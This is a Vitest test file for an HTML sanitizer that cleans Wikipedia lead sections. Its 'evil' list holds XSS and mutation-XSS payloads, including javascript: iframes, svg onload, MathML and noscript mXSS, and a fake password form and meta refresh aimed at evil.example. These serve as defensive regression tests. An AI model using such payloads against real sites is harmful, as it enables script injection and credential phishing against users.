// @vitest-environment happy-dom
import { describe, expect, it } from 'vitest';

import { policyViolations } from '../../testing/sanitizer';
import { LEAD_POLICY, cleanLead } from './safari-lead';

/** 改动之前 `safari-network.ts` 里的黑名单实现原样搬来，当作对照：证明下面的载荷以前确实能留下来。 */
function legacyCleanLead(html: string): string {
  const box = new DOMParser().parseFromString(html, 'text/html').body;
  box
    .querySelectorAll('style,script,.mw-editsection,.reference,sup.reference,.hatnote,.navbox,table,figure,.thumb')
    .forEach(node => node.remove());
  box.querySelectorAll('a[href^="/wiki/"]').forEach(link => {
    link.setAttribute('data-goto', `en.wikipedia.org${link.getAttribute('href')}`);
    link.removeAttribute('href');
  });
  box.querySelectorAll('a[href]').forEach(link => link.removeAttribute('href'));
  box.querySelectorAll('img').forEach(image => {
    const src = image.getAttribute('src') ?? '';
    if (src.startsWith('//')) image.setAttribute('src', `https:${src}`);
    image.removeAttribute('srcset');
  });
  box.querySelectorAll('*').forEach(node => {
    node
      .getAttributeNames()
      .filter(name => name.startsWith('on'))
      .forEach(name => node.removeAttribute(name));
  });
  return box.innerHTML;
}

const WORD_JOINER = '⁠';

describe('cleanLead：真实形态的导语，正常内容不变', () => {
  it('外层容器、隐藏的简述与微格式、空段落原样保留；元数据、模板样式与注释去掉', () => {
    const lead =
      '<div class="mw-content-ltr mw-parser-output" lang="en" dir="ltr">' +
      '<div class="shortdescription nomobile noexcerpt noprint searchaux" style="display:none">Operating system</div>\n' +
      '<p class="mw-empty-elt">\n</p>\n' +
      '<style data-mw-deduplicate="TemplateStyles:r1126788409">.mw-parser-output .x{color:red}</style>' +
      '<link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r1126788409">' +
      '<p><b>Example OS</b> is a <i>system</i> by <small>Example</small>.' +
      '<span style="display:none">(<span class="bday">1955-02-24</span>)</span></p>\n' +
      '<meta property="mw:PageProp/toc">\n<!-- \nNewPP limit report\nCached time: 20261123\n-->\n</div>';
    expect(cleanLead(lead)).toBe(
      '<div class="mw-content-ltr mw-parser-output" lang="en" dir="ltr">' +
        '<div class="shortdescription nomobile noexcerpt noprint searchaux" style="display:none">Operating system</div>\n' +
        '<p class="mw-empty-elt">\n</p>\n' +
        '<p><b>Example OS</b> is a <i>system</i> by <small>Example</small>.' +
        '<span style="display:none">(<span class="bday">1955-02-24</span>)</span></p>\n\n\n</div>'
    );
  });

  it('站内链接改成 data-goto 在本浏览器里导航，其余链接只剩文字', () => {
    const lead =
      '<p>See <a href="/wiki/Unix" class="mw-redirect" title="Unix">Unix</a>, <a href="/wiki/Help:IPA#Notes" title="x">IPA</a>, ' +
      '<a rel="mw:ExtLink nofollow" class="external text" href="https://www.example.org/os/">site</a>, <a href="#cite_note-1">note</a>, ' +
      '<a href="//en.wikipedia.org/wiki/X">relative</a>, <a href="javascript:alert(1)" onclick="alert(2)">bad</a>.</p>';
    expect(cleanLead(lead)).toBe(
      '<p>See <a class="mw-redirect" title="Unix" data-goto="en.wikipedia.org/wiki/Unix">Unix</a>, ' +
        '<a title="x" data-goto="en.wikipedia.org/wiki/Help:IPA#Notes">IPA</a>, <a class="external text">site</a>, ' +
        '<a>note</a>, <a>relative</a>, <a>bad</a>.</p>'
    );
  });

  it('协议相对的图片钉成 https，srcset 与其余属性去掉；不是 https 的图片没有 src', () => {
    const lead =
      '<p><img alt="" src="//upload.wikimedia.org/wikipedia/commons/thumb/a/a1/X.png/20px-X.png" decoding="async" width="20" height="14" ' +
      'class="mw-file-element" srcset="//upload.wikimedia.org/x/30px-X.png 1.5x, //upload.wikimedia.org/x/40px-X.png 2x" ' +
      'data-file-width="900" data-file-height="600">' +
      '<img src="http://insecure.example/x.png"><img src="/w/index.php?title=Special:Redirect" onerror="alert(1)"></p>';
    expect(cleanLead(lead)).toBe(
      '<p><img alt="" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a1/X.png/20px-X.png" width="20" height="14" ' +
        'class="mw-file-element"><img><img></p>'
    );
  });

  it('脚注、编辑链接、表格、图、缩略图、导航框、提示条、样式与脚本整块去掉', () => {
    const lead =
      '<p>a<sup id="cite_ref-1" class="reference"><a href="#cite_note-1">[1]</a></sup><span class="mw-editsection">edit</span></p>' +
      '<table class="infobox"><tr><td>x</td></tr></table><figure class="mw-default-size"><img src="//u/x.png"></figure>' +
      '<div class="thumb">t</div><div class="navbox">n</div><style>p{}</style><script>alert(1)</script>' +
      '<div class="hatnote">h</div><p>b</p>';
    expect(cleanLead(lead)).toBe('<p>a</p><p>b</p>');
  });

  it('行内的格式元素：上下标、缩写、注音、引用、代码、换行', () => {
    const lead =
      '<p>H<sub>2</sub>O and E=mc<sup>2</sup>, <abbr title="literal translation" style="font-size:85%">lit.</abbr> ' +
      '<ruby>漢<rp>(</rp><rt>kan</rt><rp>)</rp></ruby> <cite>c</cite> <code>x</code> <q>q</q><br><bdi lang="ja">日本語</bdi></p>' +
      '<ul><li>one</li></ul><dl><dt>t</dt><dd>d</dd></dl><blockquote><p>quote</p></blockquote>';
    expect(cleanLead(lead)).toBe(lead);
  });

  it('MathML 公式（现在的维基直接输出 presentation MathML）原样保留', () => {
    const lead =
      `<p>Given <span class="nowrap">${WORD_JOINER}<math class="mwe-math-element mwe-math-element-inline" xmlns="http://www.w3.org/1998/Math/MathML">` +
      '<mrow data-mjx-texclass="ORD"><mstyle displaystyle="true" scriptlevel="0"><mi>a</mi><msup><mi>x</mi>' +
      '<mrow data-mjx-texclass="ORD"><mn>2</mn></mrow></msup><mo stretchy="false">+</mo><mi mathvariant="normal">b</mi>' +
      `<mspace width="0.167em"></mspace><mfrac><mn>1</mn><msqrt><mi>c</mi></msqrt></mfrac></mstyle></mrow></math>${WORD_JOINER}</span> here.</p>`;
    expect(cleanLead(lead)).toBe(lead);
  });

  it('旧形态的公式（隐藏的 MathML 加回退图片）：隐藏部分与图片的安全属性保留，批注文本去掉', () => {
    const lead =
      '<span class="mwe-math-element"><span class="mwe-math-mathml-inline mwe-math-mathml-a11y" style="display: none;">' +
      '<math xmlns="http://www.w3.org/1998/Math/MathML" alttext="{\\displaystyle x}"><semantics><mrow><mi>x</mi></mrow>' +
      '<annotation encoding="application/x-tex">{\\displaystyle x}</annotation></semantics></math></span>' +
      '<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/abc" class="mwe-math-fallback-image-inline" ' +
      'aria-hidden="true" style="vertical-align: -0.338ex; width:1.33ex; height:1.676ex;" alt="{\\displaystyle x}"></span>';
    expect(cleanLead(lead)).toBe(
      '<span class="mwe-math-element"><span class="mwe-math-mathml-inline mwe-math-mathml-a11y" style="display: none;">' +
        '<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow></semantics></math></span>' +
        '<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/abc" class="mwe-math-fallback-image-inline" ' +
        'style="vertical-align:-0.338ex" alt="{\\displaystyle x}"></span>'
    );
  });

  it('没有导语时是空串；纯文本原样', () => {
    expect(cleanLead('')).toBe('');
    expect(cleanLead('just text &amp; more')).toBe('just text &amp; more');
  });
});

describe('cleanLead：来源不可信（任何人都能编辑维基）', () => {
  const evil: readonly (readonly [string, string])[] = [
    ['iframe javascript', '<iframe src="javascript:alert(document.domain)"></iframe>'],
    ['iframe srcdoc', '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>'],
    ['object / embed', '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">'],
    ['form', '<form action="https://evil.example/login"><input name="password"><button>Sign in</button></form>'],
    [
      'svg',
      '<svg onload="alert(1)"><script>alert(2)</script><a xlink:href="javascript:alert(3)"><text>t</text></a></svg>'
    ],
    ['math href', '<math href="javascript:alert(1)"><mi xlink:href="javascript:alert(1)">x</mi></math>'],
    [
      'math mglyph mXSS',
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">'
    ],
    [
      'math annotation-xml',
      '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>'
    ],
    ['math mtext html', '<math><mtext><img src=x onerror=alert(1)></mtext></math>'],
    ['noscript mXSS', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript>'],
    [
      'meta / link / base',
      '<meta http-equiv="refresh" content="0;url=https://evil.example/"><link rel="prefetch" href="x"><base href="https://evil.example/">'
    ],
    [
      'event attributes',
      '<p onclick="alert(1)" onmouseover="alert(2)"><b onfocus="alert(3)" autofocus tabindex="0">x</b></p>'
    ],
    [
      'link as other tag',
      '<a href="/wiki/Foo" onclick="alert(1)" data-goto="evil.example" data-openext="https://evil.example/">x</a>'
    ],
    [
      'data-* hooks',
      '<span data-goto="evil.example/phish" data-openext="https://evil.example/" data-tryframe="evil.example">x</span>'
    ],
    ['id clobbering', '<p id="stage" class="on">x</p><img name="x" id="toast">'],
    [
      'overlay style',
      '<div style="position:fixed;inset:0;z-index:99999;background:url(javascript:alert(1))">Sign in again</div>'
    ],
    ['javascript image', '<img src="javascript:alert(1)"><img src="data:image/svg+xml,<svg onload=alert(1)>">'],
    ['comment', '<!--[if IE]><script>alert(1)</script><![endif]--><p>x</p>']
  ];

  it.each(evil)('%s：结果只剩白名单内的东西，再净化一次不变', (_, lead) => {
    const clean = cleanLead(`<p>lead</p>${lead}`);
    expect(policyViolations(clean, LEAD_POLICY), clean).toEqual([]);
    expect(cleanLead(clean)).toBe(clean);
  });

  /** 注释本身不是活动内容，删掉它是因为它是变异 XSS 的载体；其余载荷都是真的。 */
  const live = evil.filter(([name]) => name !== 'comment');

  it.each(live)('对照 %s：改动之前的黑名单实现里载荷还在', (_, lead) => {
    expect(policyViolations(legacyCleanLead(`<p>lead</p>${lead}`), LEAD_POLICY)).not.toEqual([]);
  });

  it('站内链接的 data-goto 只由 href 生成：来源里自带的 data-goto、data-openext、data-tryframe 都不留', () => {
    expect(
      cleanLead(
        '<a href="/wiki/Foo" onclick="alert(1)" data-goto="evil.example" data-openext="https://evil.example/">x</a>'
      )
    ).toBe('<a data-goto="en.wikipedia.org/wiki/Foo">x</a>');
    expect(
      cleanLead('<span data-goto="evil.example/phish" data-openext="https://evil.example/" data-tryframe="x">x</span>')
    ).toBe('<span>x</span>');
    expect(cleanLead('<a data-goto="evil.example/phish">x</a><a data-goto="en.wikipedia.org/wiki/Bar">y</a>')).toBe(
      '<a>x</a><a data-goto="en.wikipedia.org/wiki/Bar">y</a>'
    );
  });

  it('表单、嵌入内容、外部资源与外来命名空间一个都不留，MathML 里的注入也一样', () => {
    expect(
      cleanLead(
        '<p>a</p><iframe src="javascript:alert(1)"></iframe><object data="x"></object><embed src="x"><svg onload="1"></svg>' +
          '<form action="x"><input name="p"><button>go</button></form><meta charset="x"><base href="x"><p>b</p>'
      )
    ).toBe('<p>a</p>go<p>b</p>');
    expect(
      cleanLead('<math><mi>x</mi><annotation-xml><script>1</script></annotation-xml><mglyph src="x"></mglyph></math>')
    ).toBe('<math><mi>x</mi></math>');
    expect(cleanLead('<math href="javascript:alert(1)"><mi onclick="1" href="x">y</mi></math>')).toBe(
      '<math><mi>y</mi></math>'
    );
  });

  it('样式只留不影响页面其余部分的声明：定位、层级与外部资源都不留', () => {
    expect(
      cleanLead('<div style="position:fixed;inset:0;z-index:99999;background:url(javascript:alert(1))">x</div>')
    ).toBe('<div>x</div>');
    expect(cleanLead('<span style="color:red;position:fixed;font-size:90%">x</span>')).toBe(
      '<span style="color:red;font-size:90%">x</span>'
    );
  });

  it('MathML 属性只留展示用的，且 xmlns 只认 MathML 命名空间', () => {
    expect(
      cleanLead(
        '<math xmlns="http://www.w3.org/1999/xhtml" display="block" alttext="a;b" onclick="1"><mo stretchy="true" lspace="url(x)">+</mo></math>'
      )
    ).toBe('<math display="block"><mo stretchy="true">+</mo></math>');
  });

  it('id、name 与未登记的属性不留（避免 DOM 劫持与样式冲突）', () => {
    expect(cleanLead('<p id="stage" class="on" role="button" tabindex="0" name="x">x</p>')).toBe('<p class="on">x</p>');
  });
});
